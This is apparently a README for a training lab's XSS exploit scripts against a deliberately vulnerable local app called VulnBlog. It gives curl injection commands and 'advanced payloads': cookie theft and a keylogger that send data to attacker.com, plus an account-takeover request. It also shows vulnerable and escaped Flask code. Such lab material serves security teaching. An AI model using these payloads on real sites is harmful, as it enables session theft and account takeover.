# VulnBlog XSS Exploits

## Overview
Cross-Site Scripting in VulnBlog's posts, comments, and user profiles.

## Target Application
- **App**: VulnBlog
- **Port**: 5001
- **Vulnerability**: Reflected & Stored XSS
- **Severity**: HIGH

## Available Exploits

### 1. reflected_xss.py
Reflected XSS in search and error pages.

### 2. stored_xss.py
Stored XSS in blog posts and comments.

**Usage**:
```bash
python reflected_xss.py http://localhost:5001
python stored_xss.py http://localhost:5001
```

## Exploitation

```bash
# Reflected XSS
curl "http://localhost:5001/search?q=<script>alert(document.cookie)</script>"

# Stored XSS in posts
curl -X POST http://localhost:5001/post/create \
  -d "title=Test&content=<script>alert('Stored XSS')</script>"

# Stored XSS in comments
curl -X POST http://localhost:5001/post/1/comment \
  -d "author=Attacker&comment=<img src=x onerror=alert(document.cookie)>"
```

## Advanced Payloads

```html
<!-- Cookie theft -->
<script>
fetch('http://attacker.com/steal?c=' + document.cookie);
</script>

<!-- Keylogger -->
<script>
document.onkeypress = function(e) {
  new Image().src = 'http://attacker.com/log?k=' + e.key;
}
</script>

<!-- Account takeover -->
<script>
fetch('/api/user', {
  method: 'PATCH',
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
```

## Testing

1. **Start VulnBlog**:
```bash
cd ../../projects/vulnblog
docker-compose up -d
```

2. **Test XSS**:
```bash
python reflected_xss.py http://localhost:5001
python stored_xss.py http://localhost:5001
```

3. **Verify in browser**:
```bash
firefox "http://localhost:5001/search?q=<script>alert(1)</script>"
```

## Defense

**Vulnerable**:
```python
# No output encoding!
return f"<h1>Search results for: {query}</h1>"

# Template without escaping
return render_template('post.html', content=post.content|safe)
```

**Fixed**:
```python
from markupsafe import escape

# Escape output
return f"<h1>Search results for: {escape(query)}</h1>"

# Template with auto-escaping (default in Jinja2)
return render_template('post.html', content=post.content)
# In template: {{ content }} is auto-escaped
```

## Notes
**WARNING**: Stored XSS in blog posts affects all readers.

## Related
- See `../../dsvpwa/xss/` for comprehensive XSS
- See `../../chatapp/xss/` for chat-based XSS
- See `../../ecomstore/xss/` for product review XSS

## References
- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
